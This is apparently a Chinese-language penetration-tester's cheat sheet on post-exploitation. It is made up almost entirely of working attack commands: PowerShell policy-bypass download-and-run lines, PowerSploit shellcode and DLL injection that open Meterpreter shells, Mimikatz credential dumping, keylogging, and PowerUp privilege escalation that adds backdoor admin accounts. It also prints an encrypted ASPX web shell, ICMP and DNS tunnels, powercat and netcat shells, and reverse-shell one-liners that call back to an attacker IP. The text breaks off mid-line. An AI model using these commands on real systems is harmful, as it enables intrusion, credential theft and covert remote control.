<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">运行<span class="built_in">ps</span>文件</span><br><span class="line"><span class="number">1</span>、本地运行：</span><br><span class="line">powershell.exe <span class="literal">-executionpolicy</span> bypass <span class="operator">-file</span> xxx.ps1</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、本地隐藏运行：</span><br><span class="line">powershell.exe <span class="literal">-executionpolicy</span> bypass <span class="literal">-windowstyle</span> <span class="keyword">hidden</span> <span class="literal">-nologo</span> <span class="literal">-nonlnteractive</span> <span class="literal">-noprofile</span> <span class="operator">-file</span> xxx.ps1</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、<span class="built_in">IEX</span>下载远程脚本执行:</span><br><span class="line">powershell.exe <span class="literal">-executionpolicy</span> bypass <span class="literal">-windowstyle</span> <span class="keyword">hidden</span> <span class="literal">-noprofile</span> <span class="literal">-noni</span> <span class="built_in">IEX</span>(<span class="built_in">new-objectnet</span>.webclient),downloadstring(<span class="string">&quot;xxx.ps1&quot;</span>);[<span class="type">parameters</span>]</span><br><span class="line"></span><br><span class="line"><span class="literal">-executionpolicy</span> bypass 参数可以绕过安全策略</span><br><span class="line"><span class="literal">-windowstyle</span> <span class="keyword">hidden</span>  隐藏窗口</span><br><span class="line"><span class="literal">-nologo</span>  启动不显示版权标志的powershell</span><br><span class="line"><span class="literal">-noni</span> （NoInteractive） 非交互模式</span><br><span class="line"><span class="literal">-nop</span> （NoProfile）  powershell启动不加载当前用户的配置文件</span><br><span class="line">noexit  执行后不退出shell，一般用于键盘记录等脚本</span><br></pre></td></tr></table></figure>





<p>内网书：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">运行<span class="built_in">ps</span>文件</span><br><span class="line"><span class="number">1</span>、远程下载运行：</span><br><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-exec</span> bypass <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.1.1/Invoke-ARPScan.ps1&#x27;);Invoke-ARPScan -CIDR 192.168.1.0/20&quot;</span> &gt;&gt; log.txt</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、本地运行</span><br><span class="line">powershell <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">&quot;&amp;&#123;Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/20&#125;&quot;</span> &gt;&gt; log.txt</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、无条件运行</span><br><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-exec</span> bypass <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.1.1/Invoke-ARPScan.ps1&#x27;);Invoke-ARPScan -Hosts 192.168.1.0/24 -T 4 -ports &#x27;80,445,1433,3389,8080&#x27; -oA result.txt&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="powersploit"><a href="#powersploit" class="headerlink" title="powersploit"></a>powersploit</h2><p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
<p>使用powersploit反弹msf会话</p>
<p>①直接执行shellcode反弹msf shell</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>：使用msfvenom生成<span class="built_in">ps</span>脚本木马</span><br><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_https lhost=<span class="number">192.168</span>.<span class="number">168.168</span> lport=<span class="number">8001</span> <span class="operator">-f</span> powershell <span class="literal">-o</span> test</span><br><span class="line"><span class="number">2</span>：通过目标机powershell下载powersploit中的脚本</span><br><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.168.168:8008/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)</span><br><span class="line"><span class="number">3</span>：下载生成的<span class="built_in">ps</span>脚本木马</span><br><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.168.168/test&quot;</span>)</span><br><span class="line"><span class="number">4</span>：执行木马  Force表示不用提示，直接执行</span><br><span class="line"><span class="built_in">Invoke-Shellcode</span> <span class="literal">-Shellcode</span> (<span class="variable">$buf</span>) <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<p>②指定进程注入shellcode反弹msf shell</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>：同上，下载所需脚本和脚本木马</span><br><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.168.168/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)</span><br><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.168.168/test&quot;</span>)</span><br><span class="line"><span class="number">2</span>：隐藏窗口打开某应用，创建进程。<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span>不显示窗口打开</span><br><span class="line"><span class="built_in">start-process</span> c:\windows\system32\notepad.exe <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span></span><br><span class="line"><span class="number">3</span>：查看创建的进程pid</span><br><span class="line"><span class="built_in">get-process</span></span><br><span class="line"><span class="number">4</span>：使用脚本注入进程</span><br><span class="line"><span class="built_in">Invoke-Shellcode</span> <span class="literal">-ProcessID</span> <span class="number">8888</span> <span class="literal">-Shellcode</span>(<span class="variable">$buf</span>) <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<p>③通过DLL注入，反弹msf shell  （使用Invoke-DllInjection）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>：下载对应脚本</span><br><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.168.168/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;</span>)</span><br><span class="line"><span class="number">2</span>：生成DLL注入脚本</span><br><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">168.168</span> lport=<span class="number">8001</span> <span class="operator">-f</span> dll <span class="literal">-o</span> test.dll</span><br><span class="line"><span class="number">3</span>：隐藏窗口打开某应用，创建进程。<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span>不显示窗口打开</span><br><span class="line"><span class="built_in">start-process</span> c:\windows\system32\notepad.exe <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span></span><br><span class="line"><span class="number">4</span>：查看创建的进程pid</span><br><span class="line"><span class="built_in">get-process</span></span><br><span class="line"><span class="number">5</span>：进行注入</span><br><span class="line"><span class="built_in">Invoke-DllInjection</span> <span class="literal">-ProcessID</span> <span class="number">8888</span> <span class="literal">-Dll</span> c:\test.dll</span><br></pre></td></tr></table></figure>

<p>端口扫描</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.168.168/PowerSploit/Recon/Invoke-Portscan.ps1&quot;</span>)</span><br><span class="line"><span class="built_in">Invoke-Portscan</span> <span class="literal">-Hosts</span> <span class="number">192.168</span>.<span class="number">31.1</span>,<span class="number">192.168</span>.<span class="number">31.247</span> <span class="literal">-Ports</span> <span class="string">&quot;80,22,3389&quot;</span></span><br></pre></td></tr></table></figure>

<p>猕猴桃</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.168.168/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&quot;</span>)</span><br><span class="line"><span class="built_in">Invoke-Mimikat</span> <span class="literal">-DumpCreds</span></span><br></pre></td></tr></table></figure>

<p>键盘记录</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.168.168/PowerSploit/Exfiltration/Get-Keystrokes.ps1&quot;</span>)</span><br><span class="line"><span class="built_in">Get-Keystrokes</span> <span class="literal">-LogPath</span> c:\test.txt</span><br></pre></td></tr></table></figure>

<p>PowerUp    </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.168.168/PowerSploit/Privesc/PowerUp.ps1&quot;</span>)</span><br><span class="line">\\可以下载后本地加载：</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerUp.ps1</span><br><span class="line"><span class="built_in">get-help</span> PowerUp <span class="literal">-full</span>   \\查看详细说明</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span>  自动执行PowerUp下所有脚本检查目标主机</span><br><span class="line"><span class="built_in">Find-Pathdllhijack</span>   查看当前可写目录</span><br><span class="line"><span class="built_in">Get-ApplicationHost</span>   利用系统的applicationHost.config 恢复加密过的应用池和虚拟目录的密码</span><br><span class="line"><span class="built_in">Get-ApplicationHost</span> | <span class="built_in">Format-Table</span> <span class="literal">-Autosize</span>  列表显示结果</span><br><span class="line"><span class="built_in">Get-RegistryAlwaysInstallElevated</span>   检查AlwaysInstallElevated注册表项是否被设置，是则msi文件是以system权限运行</span><br><span class="line"><span class="built_in">Get-RegistryAutoLogon</span>   用于检测Winlogin注册表的AutoAdminLogon项有没有被设置，可查询默认用户名和密码</span><br><span class="line"><span class="built_in">Get-ServiceDetail</span>  <span class="literal">-ServiceName</span> Dhcp  获取DHCP服务的详细信息</span><br><span class="line"><span class="built_in">Get-ServiceFilePermission</span>   用于检查当前用户的哪些服务的目录写入关联的可执行文件，可用于提权</span><br><span class="line"><span class="built_in">Test-ServiceDaclPermission</span>   用于监测所有可用的服务，并尝试对打开的服务进行修改，可以修改则返回该服务对象</span><br><span class="line"><span class="built_in">Test-ServiceDaclPermission</span> <span class="literal">-ServiceName</span> VulnSVC 检测某个用户是否在服务中有自由访问控制的权限 ？？？？？（写的有问题，有时间测试一下）</span><br><span class="line"><span class="built_in">Get-ServiceUnquoted</span>  用于检测服务路径，返回包含空格都是不带引号的服务路径。可检测空格路径漏洞</span><br><span class="line">	\\空格路径漏洞</span><br><span class="line">	C:\program files\hello.exe</span><br><span class="line">	在cmd中输入上面的内容，会解释成两种路径，且都执行。C:\program.exe和C:\program files\hello.exe</span><br><span class="line"><span class="built_in">Get-UnattendedInstallFile</span>   检测以下文件是否存在。这些文件可能包含部署凭据</span><br><span class="line">	C:\sysprep\sysprep.xml</span><br><span class="line">	C:\sysprep\sysprep.inf</span><br><span class="line">	C:\sysprep.inf</span><br><span class="line">	C:\Windows\Panther\Unattended.xml</span><br><span class="line">	C:\Windows\Panther\Unattend.xml</span><br><span class="line">	C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">	C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">	C:\Windows\System32\Sysprep\unattend.xml</span><br><span class="line">	C:\Windows\System32\Sysprep\Panther\unattend.xml</span><br><span class="line"><span class="built_in">Get-ModifiableRegistryAutoRun</span>   检测开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径，被检测的注册表有：</span><br><span class="line">	HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">	HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">	HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService</span><br><span class="line">	HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService</span><br><span class="line">	HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">	HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">	HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService</span><br><span class="line">	HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService</span><br><span class="line"><span class="built_in">Get-ModifiableScheduledTaskFile</span>   查询当前用户可修改的计划任务程序的路径和名称</span><br><span class="line"><span class="built_in">Get-Webconfig</span>  查询当前服务器上的web.config文件中的数据库连接字符串配置</span><br><span class="line"><span class="built_in">Invoke-ServiceAbuse</span>  通过修改服务添加用户到指定组</span><br><span class="line">	<span class="built_in">Invoke-ServiceAbuse</span> <span class="literal">-ServiceName</span> VulnSVC   添加默认账号</span><br><span class="line">	<span class="built_in">Invoke-ServiceAbuse</span> <span class="literal">-ServiceName</span> VulnSVC <span class="literal">-UserName</span> <span class="string">&quot;TEST\GabgM&quot;</span>  添加指定的用户名GabgM到TEST域内</span><br><span class="line">	<span class="built_in">Invoke-ServiceAbuse</span> <span class="literal">-ServiceName</span> VulnSVC <span class="literal">-UserName</span> backdoor <span class="literal">-Password</span> password <span class="literal">-LocalGroup</span> <span class="string">&quot;Administrators&quot;</span> 指定用户名和密码添加到本地管理员用户组</span><br><span class="line">	<span class="built_in">Invoke-ServiceAbuse</span> <span class="literal">-ServiceName</span> VulnSVC <span class="literal">-Command</span> <span class="string">&quot;net ...&quot;</span> 自定义执行命令</span><br><span class="line"><span class="built_in">Restore-ServiceBinary</span> <span class="literal">-ServiceName</span> VulnSVC   恢复指定服务的可执行文件到原始目录</span><br><span class="line"><span class="built_in">Write-HijackDll</span>  用于输出一个自定义命令并且能自我删除的bat文件到<span class="variable">$env:Temp</span>\debug.bat,并且输出一个能启动这个bat文件的DLL</span><br><span class="line"><span class="built_in">Write-UserAddMSI</span>  生成一个安装文件，运行文件后会弹出添加用户的对话框</span><br><span class="line"><span class="built_in">write-ServiceBinary</span>  使用预编译的C<span class="comment">#可执行文件，创建账号</span></span><br><span class="line">	<span class="built_in">write-ServiceBinary</span> <span class="literal">-ServiceName</span> VulnSVC   添加默认账号</span><br><span class="line">	<span class="built_in">write-ServiceBinary</span> <span class="literal">-ServiceName</span> VulnSVC <span class="literal">-UserName</span> <span class="string">&quot;TEST\GabgM&quot;</span>  添加指定的用户名GabgM到TEST域内</span><br><span class="line">	<span class="built_in">write-ServiceBinary</span> <span class="literal">-ServiceName</span> VulnSVC <span class="literal">-UserName</span> backdoor <span class="literal">-Password</span> password <span class="literal">-LocalGroup</span> <span class="string">&quot;Administrators&quot;</span> 指定用户名和密码添加到本地管理员用户组</span><br><span class="line">	<span class="built_in">write-ServiceBinary</span> <span class="literal">-ServiceName</span> VulnSVC <span class="literal">-Command</span> <span class="string">&quot;net ...&quot;</span> 自定义执行命令</span><br><span class="line"><span class="built_in">Install-ServiceBinary</span> 通过<span class="built_in">write-ServiceBinary</span>写一个C<span class="comment">#服务来添加用户  套娃？？？</span></span><br><span class="line">	<span class="built_in">Install-ServiceBinary</span> <span class="literal">-ServiceName</span> VulnSVC   添加默认账号</span><br><span class="line">	<span class="built_in">Install-ServiceBinary</span> <span class="literal">-ServiceName</span> VulnSVC <span class="literal">-UserName</span> <span class="string">&quot;TEST\GabgM&quot;</span>  添加指定的用户名GabgM到TEST域内</span><br><span class="line">	<span class="built_in">Install-ServiceBinary</span> <span class="literal">-ServiceName</span> VulnSVC <span class="literal">-UserName</span> backdoor <span class="literal">-Password</span> password <span class="literal">-LocalGroup</span> <span class="string">&quot;Administrators&quot;</span> 指定用户名和密码添加到本地管理员用户组</span><br><span class="line">	<span class="built_in">Install-ServiceBinary</span> <span class="literal">-ServiceName</span> VulnSVC <span class="literal">-Command</span> <span class="string">&quot;net ...&quot;</span> 自定义执行命令</span><br></pre></td></tr></table></figure>



<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; <span class="variable">%&gt;&lt;%</span>@Import Namespace=&quot;System.Reflection&quot;<span class="variable">%&gt;&lt;%</span>Session.Add(&quot;k&quot;,&quot;e45e329feb5d925b&quot;); /*该密钥为连接密码<span class="number">32</span>位md5值的前<span class="number">16</span>位，默认连接密码rebeyond*/byte[] k = Encoding.Default.GetBytes(Session[<span class="number">0</span>] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, <span class="number">0</span>, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;</span><br></pre></td></tr></table></figure>



<h1 id="隐秘隧道工具"><a href="#隐秘隧道工具" class="headerlink" title="隐秘隧道工具"></a>隐秘隧道工具</h1><p><img src="/images/image-20220223225007451.png" alt="image-20220223225007451"></p>
<h2 id="ICMP隧道工具"><a href="#ICMP隧道工具" class="headerlink" title="ICMP隧道工具"></a>ICMP隧道工具</h2><p> pingtunnel、icmptunnel、icmpsh、powershell icmp等  （ipv6隧道可以研究研究，工具有：Socat，nt6tunnel）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icmpsh：github.com/inquisb/icmpsh      </span><br><span class="line">linux需要先apt安装python-impacket</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1   //设置只应答一次，不然就和ping命令一样一直发送</span><br><span class="line">vps：./icmpsh_m.py 192.168.168.168 目标机ip</span><br><span class="line">或者：./run.sh   </span><br><span class="line">目标机：icmpsh.exe -t 192.168.168.168 -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pingtunnel：</span><br><span class="line">安装：http://freshmeat.sourceforge.<span class="built_in">net</span>/projects/ptunnel/</span><br><span class="line">tar xf PingTunnel-<span class="number">0</span>.<span class="number">72</span>.tar.gz</span><br><span class="line"><span class="built_in">cd</span> PingTunnel</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">如果提示缺少pcap.h</span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-<span class="number">1</span>.<span class="number">9</span>.<span class="number">0</span>.tar.gz</span><br><span class="line">tar zxvf libpcap-<span class="number">1</span>.<span class="number">9</span>.<span class="number">0</span>.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libpcap-<span class="number">1</span>.<span class="number">9</span>.<span class="number">0</span></span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">如果提示yacc包错误</span><br><span class="line">apt-get install -y byacc</span><br><span class="line"></span><br><span class="line">使用：</span><br><span class="line">目标机<span class="number">1</span>：ptunnel -x shuteer</span><br><span class="line"><span class="function">vps: <span class="title">ptunnel</span> -<span class="title">p</span> 目标机<span class="title">ip1</span> -<span class="title">lp</span> 1080 -<span class="title">da</span> 目标机<span class="title">ip2</span> -<span class="title">dp</span> 3389 -<span class="title">x</span> <span class="title">shuteer</span></span></span><br><span class="line"><span class="function">-<span class="title">x</span> 指定密码</span></span><br><span class="line"><span class="function">-<span class="title">p</span> 指定连接<span class="title">vps</span>的跳板机的<span class="title">ip</span></span></span><br><span class="line"><span class="function">-<span class="title">lp</span>  指定要监听的本地<span class="title">tcp</span>端口</span></span><br><span class="line"><span class="function">-<span class="title">da</span>  指定要转发的机器<span class="title">ip</span>地址</span></span><br><span class="line"><span class="function">-<span class="title">dp</span>  指定要转发的机器<span class="title">tcp</span>端口</span></span><br></pre></td></tr></table></figure>



<h2 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">powercat:   <span class="title">http</span>://<span class="title">github.com</span>/<span class="title">besimorhino</span>/<span class="title">powercat</span></span></span><br><span class="line"><span class="function">①、正向：</span></span><br><span class="line"><span class="function">目标机：<span class="title">powercat</span> -<span class="title">l</span> -<span class="title">p</span> 8080 -<span class="title">e</span> <span class="title">cmd.exe</span> -<span class="title">v</span></span></span><br><span class="line"><span class="function"><span class="title">vps</span>：<span class="title">nc</span> 目标机<span class="title">ip</span> 8080 -<span class="title">vv</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">②、反向：</span></span><br><span class="line"><span class="function"><span class="title">vps</span>: <span class="title">nc</span> -<span class="title">l</span> -<span class="title">p</span> 8080 -<span class="title">vv</span></span></span><br><span class="line"><span class="function">目标机：<span class="title">powercat</span> -<span class="title">c</span> 192.168.168.168 -<span class="title">p</span> 8080 -<span class="title">v</span> -<span class="title">e</span> <span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">③、反向返回<span class="title">powershell</span>：</span></span><br><span class="line"><span class="function"><span class="title">vps</span>：<span class="title">powercat</span> -<span class="title">l</span> -<span class="title">p</span> 8080 -<span class="title">v</span></span></span><br><span class="line"><span class="function">目标机:<span class="title">powercat</span> -<span class="title">c</span> 192.168.168.168 -<span class="title">p</span> 8080 -<span class="title">v</span> -<span class="title">ep</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">④、文件传输：（主机2传输到主机1）</span></span><br><span class="line"><span class="function">主机1：<span class="title">powercat</span> -<span class="title">l</span> -<span class="title">p</span> 8080 -<span class="title">of</span> <span class="title">c</span>:\<span class="title">test.txt</span> -<span class="title">v</span></span></span><br><span class="line"><span class="function">主机2：<span class="title">powercat</span> -<span class="title">c</span> 192.168.168.168 -<span class="title">p</span> 8080 -<span class="title">i</span> <span class="title">c</span>:\<span class="title">test.txt</span> -<span class="title">v</span></span></span><br><span class="line"><span class="function">注意：完成传输后，连接不会断开。在主机2的传输窗口里输入字符串的话，也会写入主机1指定的文件中。按<span class="title">ctrl</span>+<span class="title">c</span>退出即可。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">⑥、生成<span class="title">payload</span>文件（免杀）</span></span><br><span class="line"><span class="function"><span class="title">vps</span>：<span class="title">powercat</span> -<span class="title">l</span> -<span class="title">p</span> 8080 -<span class="title">e</span> <span class="title">cmd</span> -<span class="title">v</span> -<span class="title">g</span> &gt;&gt; <span class="title">shell.ps1</span></span></span><br><span class="line"><span class="function">主机：./<span class="title">shell.ps1</span></span></span><br><span class="line"><span class="function"><span class="title">powercat</span> -<span class="title">c</span> 目标主机<span class="title">ip</span> -<span class="title">v</span> 8080 -<span class="title">v</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">⑥、生成<span class="title">shellcode</span></span></span><br><span class="line"><span class="function"><span class="title">vps</span>：<span class="title">powercat</span> -<span class="title">l</span> -<span class="title">p</span> 8080 -<span class="title">e</span> <span class="title">cmd</span> -<span class="title">v</span> -<span class="title">ge</span></span></span><br><span class="line"><span class="function">主机：<span class="title">powershell</span> -<span class="title">E</span> 生成的<span class="title">shellcode</span></span></span><br><span class="line"><span class="function"><span class="title">powercat</span> -<span class="title">c</span> 目标主机<span class="title">ip</span> -<span class="title">v</span> 8080 -<span class="title">v</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">⑦、<span class="title">powercat</span> 走<span class="title">DNS</span>协议（需要<span class="title">dnscat</span>） （<span class="title">dnscat</span>需要<span class="title">ruby</span>环境）（不要用<span class="title">ubuntu</span>，<span class="title">ubuntu</span>已经使用53端口，关闭后无法上网）</span></span><br><span class="line"><span class="function">安装<span class="title">dnscat</span>：</span></span><br><span class="line"><span class="function"><span class="title">git</span> <span class="title">clone</span> <span class="title">https</span>://<span class="title">github.com</span>/<span class="title">iagox86</span>/<span class="title">dnscat2.git</span></span></span><br><span class="line"><span class="function"><span class="title">cd</span> <span class="title">dnscat2</span>/<span class="title">server</span>/</span></span><br><span class="line"><span class="function"><span class="title">gem</span> <span class="title">install</span> <span class="title">gundler</span></span></span><br><span class="line"><span class="function"><span class="title">bundle</span> <span class="title">install</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">linux</span> <span class="title">vps:ruby</span> <span class="title">dnscat2.rb</span> <span class="title">gabgm.test</span> -<span class="title">e</span> <span class="title">open</span> --<span class="title">no</span>-<span class="title">cache</span></span></span><br><span class="line"><span class="function">目标机：<span class="title">powercat</span> -<span class="title">c</span> 192.168.168.168 -<span class="title">p</span> 53 -<span class="title">dns</span> <span class="title">dns2.rb</span> <span class="title">gabgm.test</span> -<span class="title">e</span> <span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function">连接后，<span class="title">session</span> -<span class="title">i</span> 1 进入会话</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">⑧、端口转发(转发3389？)</span></span><br><span class="line"><span class="function">内网服务器：<span class="title">powercat</span> -<span class="title">l</span> -<span class="title">v</span> -<span class="title">p</span> 9999 -<span class="title">e</span> <span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function"><span class="title">vps</span>：<span class="title">nc</span> 网络边界服务器<span class="title">ip</span> 8000 -<span class="title">vv</span></span></span><br><span class="line"><span class="function">网络边界服务器：<span class="title">powercat</span> -<span class="title">l</span> -<span class="title">v</span> -<span class="title">p</span> 8000 -<span class="title">r</span> <span class="title">tcp</span>:内网<span class="title">ip</span>:9999</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">⑨、端口转发（使用<span class="title">DNS</span>协议）</span></span><br><span class="line"><span class="function"><span class="title">linux</span> <span class="title">vps</span>：<span class="title">ruby</span> <span class="title">dnscat2.rb</span> <span class="title">gabgm.test</span> -<span class="title">e</span> <span class="title">open</span> --<span class="title">no</span>-<span class="title">cache</span></span></span><br><span class="line"><span class="function">网络边界服务器：<span class="title">powercat</span> -<span class="title">l</span> -<span class="title">p</span> 8080 -<span class="title">r</span> <span class="title">dns</span>:192.168.168.168::<span class="title">gabgm.test</span></span></span><br><span class="line"><span class="function">内网服务器：<span class="title">powercat</span> -<span class="title">c</span> 网络边界服务器 -<span class="title">p</span> 8080 -<span class="title">e</span> <span class="title">cmd.exe</span> -<span class="title">v</span></span></span><br></pre></td></tr></table></figure>

<h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc_safe windows下载：https://joncraton.org/files/nc111nt_safe.zip</span><br><span class="line">nc windows下载：https://joncraton.org/files/nc111nt.zip</span><br><span class="line">linux下载安装：</span><br><span class="line">①yum install nc.x86_64</span><br><span class="line">②wget http://sourceforge.<span class="built_in">net</span>/projects/netcat/files/netcat/<span class="number">0</span>.<span class="number">7</span>.<span class="number">1</span>/netcat-<span class="number">0</span>.<span class="number">7</span>.<span class="number">1</span>.tar.gz/download -O netcat-<span class="number">0</span>.<span class="number">7</span>.<span class="number">0</span>.tar.gz   下载后需要编译</span><br><span class="line"></span><br><span class="line">扫描<span class="number">80</span>端口</span><br><span class="line">nc -nv ip <span class="number">80</span></span><br><span class="line">扫描<span class="number">20</span>-<span class="number">8080</span>端口段</span><br><span class="line">nc -v -z ip <span class="number">20</span>-<span class="number">8080</span></span><br><span class="line">端口扫描速度不是很快</span><br><span class="line"></span><br><span class="line">监听本地<span class="number">8080</span>端口</span><br><span class="line">nc -l -p <span class="number">8080</span></span><br><span class="line"></span><br><span class="line">文件传输,接收端监听端口，将数据写入到文件，发送端打开文件，发送数据</span><br><span class="line">接收文件主机：nc -lp <span class="number">8080</span> &gt; test.txt</span><br><span class="line">发送文件主机：nc -vn 接收文件主机ip <span class="number">8080</span> &lt; test.txt -q <span class="number">1</span></span><br><span class="line"></span><br><span class="line">不加导出文件参数就是简易聊天工具</span><br><span class="line">主机<span class="number">1</span>：nc -lp <span class="number">8080</span></span><br><span class="line">主机<span class="number">2</span>：nc -vn 主机<span class="number">1</span>ip <span class="number">8080</span></span><br><span class="line"></span><br><span class="line">正向shell</span><br><span class="line">目标机：</span><br><span class="line">nc -lvp <span class="number">4444</span> -e /bin/sh</span><br><span class="line">nc -lvp <span class="number">444</span> -e c:\windows\system32\<span class="built_in">cmd</span>.exe</span><br><span class="line">vps：</span><br><span class="line">nc 目标机ip <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反向shell</span><br><span class="line">vps：</span><br><span class="line">nc -lvp <span class="number">9999</span></span><br><span class="line">目标机：</span><br><span class="line">nc <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span> <span class="number">9999</span> -e /bin/sh</span><br><span class="line">nc <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span> <span class="number">9999</span> -e c:\windows\system32\<span class="built_in">cmd</span>.exe</span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>&quot;,<span class="number">9999</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.<span class="keyword">call</span>([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/<span class="number">9999</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>&quot;,<span class="number">9999</span>);exec(&quot;/bin/sh -i &lt;&amp;<span class="number">3</span> &gt;&amp;<span class="number">3</span> <span class="number">2</span>&gt;&amp;<span class="number">3</span>&quot;);&#x27;</span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;<span class="number">210</span>.<span class="number">61</span>.<span class="number">186</span>.<span class="number">116</span>&quot;,<span 